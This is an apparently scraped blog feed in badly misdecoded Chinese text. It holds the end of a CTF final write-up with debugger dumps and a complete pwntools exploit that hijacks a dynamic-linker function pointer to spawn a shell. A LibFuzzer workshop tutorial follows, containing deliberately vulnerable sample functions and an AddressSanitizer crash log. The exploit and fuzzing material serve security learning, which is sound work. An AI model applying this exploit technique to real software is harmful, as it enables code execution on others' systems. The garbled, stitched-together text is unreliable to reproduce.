æ­¤æˆ‘ä»¬åœ¨stacké‡Œæ”¾å…¥1ä½œä¸ºåç§»ï¼Œå†æ‰§è¡Œ1æ“ä½œå³å¯å°†Libcé‡Œçš„åœ°å€å†™å…¥stacké‡Œã€‚ 12345678910111213pwndbg&gt; x/20gx 0x8070000x807000: 0x0000000000000000 0x00000000000000510x807010: 0x000000000000001c 0x00000000000007f80x807020: 0x0000000000807060 0x00000000000010000x807030: 0x0000000000601fa0 0x00000000000010000x807040: 0x0000000000809080 0x00000000000010000x807050: 0x0000000000000000 0x00000000000010110x807060: 0x0000000000000000 0x00000000000000000x807070: 0x0000000000000000 0x00000000000000000x807080: 0x0000000000000000 0x00000000000000000x807090: 0x0000000000000000 0x0000000000000000pwndbg&gt; telescope 0x0000000000807060+0x7f800:0000â”‚ rdx 0x807858 â€”â–¸ 0x7efdc21586a0 (puts) â—‚â€” push r12 3.ä¹‹åæˆ‘ä»¬é€šè¿‡+è¿ç®—å°†å…¶æ”¹ä¸ºone_gadgetï¼Œç„¶åå†é€šè¿‡æ­¥éª¤2åœ¨stacké‡Œå†™å…¥ä¸€ä¸ªlibcçš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°†ä½œä¸ºåé¢çš„offsetã€‚ ç”±äºé¢˜ç›®ä¿æŠ¤æ— æ³•æ”¹å†™gotè¡¨ï¼Œruanå¸ˆå‚…æ•™æˆ‘äº†ä¸ªæ–°å§¿åŠ¿ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ 0x7f118c176b24 &lt;_dl_fini+52&gt; lea rcx, [rip + 0x215515] &lt;0x7f118c38c040&gt; 0x7f118c176b2b &lt;_dl_fini+59&gt; shl rax, 4 0x7f118c176b2f &lt;_dl_fini+63&gt; lea r12, [rcx + rax - 0x88] 0x7f118c176b37 &lt;_dl_fini+71&gt; jmp _dl_fini+119 &lt;_dl_fini+119&gt; â†“ 0x7f118c176b67 &lt;_dl_fini+119&gt; lea rdi, [rip + 0x215dda] &lt;0x7f118c38c948&gt; â–º 0x7f118c176b6e &lt;_dl_fini+126&gt; call qword ptr [rip + 0x2163d4] &lt;rtld_lock_default_lock_recursive&gt; rdi: 0x7f118c38c948 (_rtld_global+2312) â—‚â€” 0x0 rsi: 0x0 rdx: 0x7f118c176af0 (_dl_fini) â—‚â€” push rbp rcx: 0x7f118c38c040 (_rtld_global) â€”â–¸ 0x7f118c38d168 â—‚â€” 0x0 0x7f118c176b74 &lt;_dl_fini+132&gt; mov ecx, dword ptr [r12] 0x7f118c176b78 &lt;_dl_fini+136&gt; test ecx, ecx 0x7f118c176b7a &lt;_dl_fini+138&gt; je _dl_fini+80 &lt;_dl_fini+80&gt; 0x7f118c176b7c &lt;_dl_fini+140&gt; mov rax, qword ptr [r12 - 8] 0x7f118c176b81 &lt;_dl_fini+145&gt; movzx edx, byte ptr [rax + 0x315]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ rsp 0x7ffe200d3a80 â€”â–¸ 0x7f118c161620 (_IO_2_1_stdout_) â—‚â€” 0xfbad288701:0008â”‚ 0x7ffe200d3a88 â—‚â€” 0x102:0010â”‚ 0x7ffe200d3a90 â€”â–¸ 0x7f118c1616a3 (_IO_2_1_stdout_+131) â—‚â€” 0x162780000000000a /* '\\n' */03:0018â”‚ 0x7ffe200d3a98 â€”â–¸ 0x7ffe200d3c30 â—‚â€” 0x104:0020â”‚ 0x7ffe200d3aa0 â—‚â€” 0x005:0028â”‚ 0x7ffe200d3aa8 â€”â–¸ 0x7f118be16419 (_IO_do_write+121) â—‚â€” mov r13, rax06:0030â”‚ 0x7ffe200d3ab0 â€”â–¸ 0x7ffe200d3c30 â—‚â€” 0x107:0038â”‚ 0x7ffe200d3ab8 â€”â–¸ 0x7f118c161620 (_IO_2_1_stdout_) â—‚â€” 0xfbad2887â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ â–º f 0 7f118c176b6e _dl_fini+126 f 1 7f118bdd6008 __run_exit_handlers+232 f 2 7f118bdd6055 f 3 7f118bdbc847 __libc_start_main+247â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€pwndbg&gt; telescope 0x7f118c176b74+0x2163d400:0000â”‚ 0x7f118c38cf48 (_rtld_global+3848) â€”â–¸ 0x7f118c166c90 (rtld_lock_default_lock_recursive) â—‚â€” add dword ptr [rdi + 4], 101:0008â”‚ 0x7f118c38cf50 (_rtld_global+3856) â€”â–¸ 0x7f118c166ca0 (rtld_lock_default_unlock_recursive) â—‚â€” sub dword ptr [rdi + 4], 102:0010â”‚ 0x7f118c38cf58 (_rtld_global+3864) â€”â–¸ 0x7f118c17a0e0 (_dl_make_stack_executable) â—‚â€” push rbp03:0018â”‚ 0x7f118c38cf60 (_rtld_global+3872) â—‚â€” 0x604:0020â”‚ 0x7f118c38cf68 (_rtld_global+3880) â—‚â€” 0x105:0028â”‚ 0x7f118c38cf70 (_rtld_global+3888) â€”â–¸ 0x7f118c3708f8 â—‚â€” 0x40 /* '@' */ åœ¨æ‰§è¡Œexitå‡½æ•°æ—¶ï¼Œä¸€ç›´æ­¥å…¥è¿›å»çœ‹åˆ°å³å°†callçš„ä½ç½®æ˜¯rtld_lock_default_lock_recursiveï¼š 0x7f118c38cf48 (_rtld_global+3848) â€”â–¸ 0x7f118c166c90 (rtld_lock_default_lock_recursive)è¿™ç§å’Œgotè¡¨çš„ç»“æ„ç±»ä¼¼ï¼Œå› æ­¤æˆ‘ä»¬åªè¦æ”¹0x7f118c38cf48 (_rtld_global+3848)æŒ‡å‘one_gadgetå³å¯æ‹¿shellï¼Œä½†è¿™ä¸ªåœ°å€æ˜¯lib/x86_64-linux-gnu/ld-2.23.soé‡Œçš„åœ°å€ï¼Œè™½ç„¶æœ¬åœ°æ˜¯å’ŒlibcåŸºåœ°å€çš„åç§»å›ºå®šï¼Œä½†è¿œç¨‹å¾€å¾€æ˜¯ä¸å›ºå®šçš„ï¼Œç›¸å·®0x1000çš„æ•´æ•°å€ï¼Œå¾—é€šè¿‡çˆ†ç ´è§£å†³ã€‚ 4.æœ¬åœ°æ—¢ç„¶å’Œlibcåç§»å›ºå®šï¼Œå°±ä¼šå’Œlibcé‡Œçš„putsåç§»å›ºå®šï¼Œè€Œ0x0000000000601fa0åˆæ˜¯ä¸€ä¸ªå›ºå®šçš„åœ°å€ï¼Œå› æ­¤åªè¦é€šè¿‡â€™+â€™è¿ç®—æ„é€ åœ°å€ä¸º0x7f118c38cf48 (_rtld_global+3848)-0x0000000000601fa0ï¼Œæœ€åæ‰§è¡Œ2æ“ä½œå³å¯ã€‚ æ„é€ ç»“æœï¼š 123pwndbg&gt; telescope 0x0000000000e10060+0x7f000:0000â”‚ 0xe10850 â—‚â€” 0x7f118bd8afa8 //offset01:0008â”‚ 0xe10858 â€”â–¸ 0x7f118be8d207 (exec_comm+2263) //one_gadget expï¼š 1234567891011121314151617181920212223242526272829303132from pwn import *context.arch = 'amd64'context.log_level = 'debug'def main(host,port = 123): global p if host: p=remote(host,port) else: p=process(&quot;./StackMachine&quot;) gdb.attach(p) one = 0xf1207 offset=one-0x06f6a0 p.recvuntil(&quot;stack size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;data size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;initial data &gt;&quot;) p.sendline(str(-0x1040)) p.recvuntil(&quot;code size &gt;&quot;) p.sendline(str(0x1000)) p.recvuntil(&quot;initial code &gt;&quot;) # gdb.attach(p) # p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2)) p.send(p8(0xe)+p64(0x601FA0)+p8(0xe)+p64(0x10000000000000000-0x1040)+p8(2)+p8(0xe)+p64(1)+p8(1)+p8(0xe)+p64(offset)+p8(3)+p8(0xe)+p64(1)+p8(1)+p8(0xe)+p64(0x5812a8)+p8(3)+p8(0xe)+p64(0x10000000000000000-0x0000000000601fa0+0x600)+p8(3)+p8(2)) p.interactive()if __name__ == '__main__': libc=ELF(&quot;./libc.so.6&quot;) main(args['REMOTE'])","link":"/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/"},{"title":"ï¼ˆè½¬ï¼‰LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰","text":"æ–‡ç« é¦–å‘äºå®‰å…¨å®¢ï¼Œç”±å®‰å…¨å®¢åŸåˆ›å‘å¸ƒï¼šhttps://www.anquanke.com/post/id/224823 LibFuzzer workshopå­¦ä¹ ä¹‹è·¯ï¼ˆä¸€ï¼‰ æœ€è¿‘åšé¡¹ç›®å¼€å§‹ä¸Šæ‰‹å­¦ä¹ libfuzzerï¼Œæ˜¯è·Ÿç€libfuzzer-workshopå­¦çš„ã€‚å†™ä¸‹è‡ªå·±çš„å¿ƒå¾—å’Œæ”¶è·ã€‚ å®˜æ–¹ç»™å‡ºçš„å®šä¹‰ 12LibFuzzer is in-process, coverage-guided, evolutionary fuzzing engine.LibFuzzer is linked with the library under test, and feeds fuzzed inputs to the library via a specific fuzzing entrypoint (aka â€œtarget functionâ€); the fuzzer then tracks which areas of the code are reached, and generates mutations on the corpus of input data in order to maximize the code coverage. The code coverage information for libFuzzer is provided by LLVMâ€™s SanitizerCoverage instrumentation. ç®€å•æ¥è¯´å°±æ˜¯é€šè¿‡ä¸è¦è¿›è¡Œfuzzçš„åº“è¿æ¥ï¼Œå¹¶å°†libfuzzerç”Ÿæˆçš„è¾“å…¥é€šè¿‡æ¨¡ç³Šæµ‹è¯•è¿›å…¥ç‚¹(fuzz target)å–‚ç»™è¦fuzzçš„åº“è¿›è¡Œfuzz testingã€‚åŒæ—¶fuzzerä¼šè·Ÿè¸ªå“ªäº›åŒºåŸŸçš„ä»£ç å·²ç»è¢«æµ‹è¯•è¿‡çš„ï¼Œå¹¶ä¸”æ ¹æ®ç§æ–™åº“çš„è¾“å…¥è¿›è¡Œå˜å¼‚æ¥ä½¿å¾—ä»£ç è¦†ç›–ç‡æœ€å¤§åŒ–ã€‚ä»£ç è¦†ç›–ç‡çš„ä¿¡æ¯æ˜¯ç”±LLVMâ€™s SanitizerCoverageæ’æ¡©æä¾›çš„ éœ€è¦æ³¨æ„çš„æ˜¯è¿™å‡ ä¸ªlibfuzzerçš„ç‰¹æ€§ï¼šin-processæŒ‡è¿›ç¨‹å†…ã€‚å³libfuzzeråœ¨fuzzæ—¶å¹¶ä¸æ˜¯äº§ç”Ÿå‡ºå¤šä¸ªè¿›ç¨‹æ¥åˆ†åˆ«å¤„ç†ä¸åŒçš„è¾“å…¥ï¼Œè€Œæ˜¯å°†æ‰€æœ‰çš„æµ‹è¯•æ•°æ®æ”¾å…¥è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ã€‚coverage-guidedæŒ‡è¦†ç›–ç‡æŒ‡å¯¼çš„ã€‚å³ä¼šè¿›è¡Œä»£ç è¦†ç›–ç‡çš„è®¡ç®—ï¼Œæ­£å¦‚å®šä¹‰æ‰€è¯´çš„ä½¿å¾—ä¸æ–­å¢å¤§ä»£ç è¦†ç›–ç‡ã€‚evolutionaryæ˜¯æŒ‡libfuzzeræ˜¯è¿›åŒ–å‹çš„fuzzï¼Œç»“åˆäº†äº§ç”Ÿå’Œå˜å¼‚ä¸¤ç§å½¢å¼ã€‚ ç¯å¢ƒæ­å»ºï¼šè·Ÿç€https://github.com/Dor1s/libfuzzer-workshop æ­å»ºå°±å¥½äº†ï¼Œä¸»è¦æ˜¯build llvmçš„ç¯å¢ƒå¯èƒ½è¦makeä¸€ä¼šå„¿ã€‚ç¼–è¯‘å¥½åæ‹¿åˆ°libfuzzer.a(é™æ€é“¾æ¥åº“æ–‡ä»¶)ï¼Œå°±å¯ä»¥å¼€å§‹ä¸Šæ‰‹å®è·µäº†ã€‚ fuzz testinglibfuzzerå·²ç»æä¾›äº†æ•°æ®æ ·æœ¬ç”Ÿæˆå’Œå¼‚å¸¸æ£€æµ‹åŠŸèƒ½ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯è¦å®ç°æ¨¡ç³Šæµ‹è¯•è¿›å…¥ç‚¹(fuzz target)ï¼Œå°†libfuzzerç”Ÿæˆçš„æ•°æ®äº¤ç»™ç›®æ ‡ç¨‹åºå¤„ç†ã€‚fuzz targetç¼–å†™æ¨¡æ¿ï¼š 12345// fuzz_target.ccextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { DoSomethingInterestingWithMyAPI(Data, Size); return 0; // Non-zero return values are reserved for future use.} éœ€è¦æ³¨æ„çš„æ˜¯LLVMFuzzerTestOneInputå‡½æ•°å³ä½¿æˆ‘ä»¬è¦å®ç°çš„æ¥å£å‡½æ•°ï¼Œä»–çš„ä¸¤ä¸ªå‚æ•°Data(libfuzzerçš„æµ‹è¯•æ ·æœ¬æ•°æ®)ï¼Œsize(æ ·æœ¬æ•°æ®çš„å¤§å°)ã€‚DoSomethingInterestingWithMyAPIå‡½æ•°å³æˆ‘ä»¬å®é™…è¦è¿›è¡Œfuzzçš„å‡½æ•°ã€‚ ç¼–è¯‘.ccæ–‡ä»¶ï¼š123clang++ -g -O1 -fsanitize=fuzzer,address \\fuzz_target.cc ../../libFuzzer/Fuzzer/libFuzzer.a \\-o fuzzer_target å‡ ä¸ªå‚æ•°ï¼š-g å¯é€‰å‚æ•°ï¼Œä¿ç•™è°ƒè¯•ç¬¦å·ã€‚-O1 æŒ‡å®šä¼˜åŒ–ç­‰çº§ä¸º1-fsanitize æŒ‡å®šsanitizeã€‚fuzzeræ˜¯å¿…é¡»çš„ï¼Œç”¨æ¥å¯ç”¨libfuzzerã€‚è¿˜å¯ä»¥é™„åŠ çš„å…¶ä»–sanitizeæœ‰ï¼šaddress(ç”¨æ¥æ£€æµ‹å†…å­˜è®¿é—®ç›¸å…³çš„é”™è¯¯ï¼Œå¦‚stack_overflow,heap_overflow,uaf,å¯ä»¥ä¸fuzzerä¸€èµ·ä½¿ç”¨)ï¼›memory(æ£€æµ‹æœªåˆå§‹åŒ–å†…å­˜çš„è®¿é—®ï¼Œåº”å•ç‹¬ä½¿ç”¨)ï¼›undefined(æ£€æµ‹å…¶ä»–çš„æ¼æ´ï¼Œå¦‚æ•´æ•°æº¢å‡ºï¼Œç±»å‹æ··æ·†ç­‰æœªå®šä¹‰çš„æ¼æ´)æ³¨ï¼š-fsanitize-coverage=trace-pc-guardé€‰é¡¹åœ¨é«˜ç‰ˆæœ¬çš„clangä¸­å·²ä¸å†é€‚ç”¨ï¼Œä»£ç çš„è¦†ç›–ç‡æƒ…å†µé»˜è®¤è‡ªåŠ¨å¼€å¯ã€‚ è¿™ä¸€æ­¥éª¤æ•´ä½“è¿‡ç¨‹å°±æ˜¯é€šè¿‡clangçš„-fsanitize=fuzzeré€‰é¡¹å¯ä»¥å¯ç”¨libFuzzerï¼Œè¿™ä¸ªé€‰é¡¹åœ¨ç¼–è¯‘å’Œé“¾æ¥è¿‡ç¨‹ä¸­ç”Ÿæ•ˆï¼Œå®ç°äº†æ¡ä»¶åˆ¤æ–­è¯­å¥å’Œåˆ†æ”¯æ‰§è¡Œçš„è®°å½•ï¼Œå¹¶ä¸”è¾…ä»¥libFuzzerä¸­çš„åº“å‡½æ•°(libfuzzer.a)ï¼Œé€šè¿‡ç”Ÿæˆä¸åŒçš„æµ‹è¯•æ ·ä¾‹ç„¶åèƒ½å¤Ÿè·å¾—ä»£ç çš„è¦†ç›–ç‡æƒ…å†µï¼Œæœ€ç»ˆå®ç°æ‰€è°“çš„fuzz testingã€‚ å¼€å§‹fuzzå…ˆæ¥lesson 04ï¼Œè¦æµ‹è¯•çš„åº“æ˜¯vulnerable_functions.hï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#ifndef LESSONS_04_VULNERABLE_FUNCTIONS_H_#define LESSLE_FONS_04_VULNERABUNCTIONS_H_#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;cstring&gt;#include &lt;array&gt;#include &lt;string&gt;#include &lt;vector&gt;bool VulnerableFunction1(const uint8_t* data, size_t size) { bool result = false; if (size &gt;= 3) { result = data[0] == 'F' &amp;&amp; data[1] == 'U' &amp;&amp; data[2] == 'Z' &amp;&amp; data[3] == 'Z'; } return result;}template&lt;class T&gt;typename T::value_type DummyHash(const T&amp; buffer) { typename T::value_type hash = 0; for (auto value : buffer) hash ^= value; return hash;}constexpr auto kMagicHeader = &quot;ZN_2016&quot;;constexpr std::size_t kMaxPacketLen = 1024;constexpr std::size_t kMaxBodyLength = 1024 - sizeof(kMagicHeader);bool VulnerableFunction2(const uint8_t* data, size_t size, bool verify_hash) { if (size &lt; sizeof(kMagicHeader)) return false; std::string header(reinterpret_cast&lt;const char*&gt;(data), sizeof(kMagicHeader)); std::array&lt;uint8_t, kMaxBodyLength&gt; body; if (strcmp(kMagicHeader, header.c_str())) return false; auto target_hash = data[--size]; if (size &gt; kMaxPacketLen) return false; if (!verify_hash) return true; std::copy(data, data + size, body.data()); auto real_hash = DummyHash(body); return real_hash == target_hash;}constexpr std::size_t kZn2016VerifyHashFlag = 0x0001000;bool VulnerableFunction3(const uint8_t* data, size_t size, std::size_t flags) { bool verify_hash = flags &amp; kZn2016VerifyHashFlag; return VulnerableFunction2(data, size, verify_hash);}#endif // LESSONS_04_VULNERABLE_FUNCTIONS_H_ é¦–å…ˆçœ‹VulnerableFunction1()ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°data/sizeï¼Œå½“size&gt;3æ—¶ä¼šäº§ç”Ÿæ•°ç»„è¶Šç•Œã€‚æ¥ä¸‹æ¥ç¼–å†™æµ‹è¯•æ¥å£ï¼š 12345678910111213//first_fuzzer.cc// Copyright 2016 Google Inc. All Rights Reserved.// Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &quot;vulnerable_functions.h&quot;extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { VulnerableFunction1(data, size); return 0;} å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥å°†Libfuzzerç”Ÿæˆçš„æµ‹è¯•æ ·ä¾‹ç»™åˆ°VulnerableFunction1å°±å¥½ã€‚æ¥ä¸‹æ¥ç¼–è¯‘ï¼šclang++ -g -std=c++11 -fsanitize=fuzzer,address first_fuzzer.cc ../../libFuzzer/Fuzzer/libFuzzer.a -o first_fuzzerç”Ÿæˆå¯æ‰§è¡Œç¨‹åºfirst_fuzzerã€‚ 12mkdir corpus1./first_fuzz corpus1 corpus1æ˜¯æˆ‘ä»¬æä¾›çš„è¯­æ–™åº“ã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¯¥è¯­æ–™åº“åº”è¯¥ä¸ºè¢«æµ‹ä»£ç æä¾›å„ç§æœ‰æ•ˆå’Œæ— æ•ˆçš„è¾“å…¥ï¼Œæ¨¡ç³Šå™¨åŸºäºå½“å‰è¯­æ–™åº“ä¸­çš„æ ·æœ¬è¾“å…¥ç”Ÿæˆéšæœºçªå˜ã€‚å¦‚æœçªå˜è§¦å‘äº†æµ‹è¯•ä»£ç ä¸­å…ˆå‰æœªè¦†ç›–çš„è·¯å¾„çš„æ‰§è¡Œï¼Œåˆ™è¯¥çªå˜å°†ä¿å­˜åˆ°è¯­æ–™åº“ä¸­ä»¥ä¾›å°†æ¥å˜æ›´ã€‚å½“ç„¶LibFuzzerä¹Ÿå¯ä»¥æ²¡æœ‰ä»»ä½•åˆå§‹ç§å­çš„æƒ…å†µä¸‹å·¥ä½œï¼ˆå› ä¸ºä¸Šé¢æåˆ°ä»–æ˜¯evolutionaryå‹çš„fuzzerï¼‰ï¼Œä½†å¦‚æœå—æµ‹è¯•çš„åº“æ¥å—å¤æ‚çš„ç»“æ„åŒ–è¾“å…¥ï¼Œåˆ™ä¼šå› ä¸ºéšæœºäº§ç”Ÿçš„æ ·ä¾‹ä¸æ˜“ç¬¦åˆå¯¼è‡´æ•ˆç‡é™ä½ã€‚å¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¤ªå¤šçš„æ ·ä¾‹å¹¶å¸Œæœ›èƒ½å¤Ÿç²¾ç®€ä¸€ä¸‹ï¼Œåˆ™å¯ä»¥ï¼š 12mkdir corpus1_min./first_fuzzer -merge=1 corpus1_min corpus1 è¿™æ ·ï¼Œcorpus1_minå°†ä¼šå­˜æ”¾ç²¾ç®€åçš„è¾“å…¥æ ·ä¾‹ã€‚ è¿è¡Œåå¾—åˆ°crashï¼Œå¾ˆå¿«å•Šï¼ï¼ï¼ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081âœ 04 git:(master) âœ— ./first_fuzzer corpus1 INFO: Seed: 2222548757INFO: Loaded 1 modules (35 inline 8-bit counters): 35 [0x7f7120, 0x7f7143), INFO: Loaded 1 PC tables (35 PCs): 35 [0x5b7a68,0x5b7c98), INFO: 0 files found in corpus1INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 27Mb#3 NEW cov: 4 ft: 4 corp: 2/4b lim: 4 exec/s: 0 rss: 27Mb L: 3/3 MS: 1 CMP- DE: &quot;\\x00\\x00&quot;-#1190 NEW cov: 5 ft: 5 corp: 3/7b lim: 14 exec/s: 0 rss: 27Mb L: 3/3 MS: 2 ChangeBinInt-CMP- DE: &quot;F\\x00&quot;-#12191 NEW cov: 6 ft: 6 corp: 4/11b lim: 122 exec/s: 0 rss: 28Mb L: 4/4 MS: 1 InsertByte-#12297 REDUCE cov: 6 ft: 6 corp: 4/10b lim: 122 exec/s: 0 rss: 28Mb L: 3/3 MS: 1 EraseBytes-#17213 REDUCE cov: 7 ft: 7 corp: 5/40b lim: 170 exec/s: 0 rss: 29Mb L: 30/30 MS: 1 InsertRepeatedBytes-#17274 REDUCE cov: 7 ft: 7 corp: 5/27b lim: 170 exec/s: 0 rss: 29Mb L: 17/17 MS: 1 EraseBytes-#17356 REDUCE cov: 7 ft: 7 corp: 5/24b lim: 170 exec/s: 0 rss: 29Mb L: 14/14 MS: 2 ChangeBit-EraseBytes-#17437 REDUCE cov: 7 ft: 7 corp: 5/18b lim: 170 exec/s: 0 rss: 29Mb L: 8/8 MS: 1 EraseBytes-#17458 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 170 exec/s: 0 rss: 29Mb L: 4/4 MS: 1 EraseBytes-===================================================================9875==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200005a1d3 at pc 0x00000059b461 bp 0x7ffd79c84880 sp 0x7ffd79c84878READ of size 1 at 0x60200005a1d3 thread T0 #0 0x59b460 in VulnerableFunction1(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14 #1 0x59bde4 in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/04/first_fuzzer.cc:10:3 #2 0x466186 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:556 #3 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #4 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #5 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #6 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #7 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #8 0x7fbfaac5abf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6) #9 0x41f599 in _start (/home/admin/libfuzzer-workshop/lessons/04/first_fuzzer+0x41f599)0x60200005a1d3 is located 0 bytes to the right of 3-byte region [0x60200005a1d0,0x60200005a1d3)allocated by thread T0 here: #0 0x597b58 in operator new[](unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/asan/asan_new_delete.cpp:102 #1 0x466092 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:541 #2 0x46b7e9 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:470 #3 0x46b7e9 in fuzzer::Fuzzer::MutateAndTestOne() /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:699 #4 0x46e80f in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:830 #5 0x456b99 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:824 #6 0x41f522 in main /home/admin/libfuzzer-workshop/src/llvm/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19 #7 0x7fbfaac5abf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)SUMMARY: AddressSanitizer: heap-buffer-overflow /home/admin/libfuzzer-workshop/lessons/04/./vulnerable_functions.h:22:14 in VulnerableFunction1(unsigned char const*, unsigned long)Shadow bytes around the buggy address: 0x0c04800033e0: fa fa fd fa fa fa fd fd fa fa fd fd fa fa fd fd 0x0c04800033f0: fa fa fd fd fa fa fd fa fa fa fd fa fa fa fd fd 0x0c0480003400: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c0480003410: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c0480003420: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa=&gt;0x0c0480003430: fa fa fd fa fa fa fd fa fa fa[03]fa fa fa fa fa 0x0c0480003440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003450: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003460: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003470: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c0480003480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: 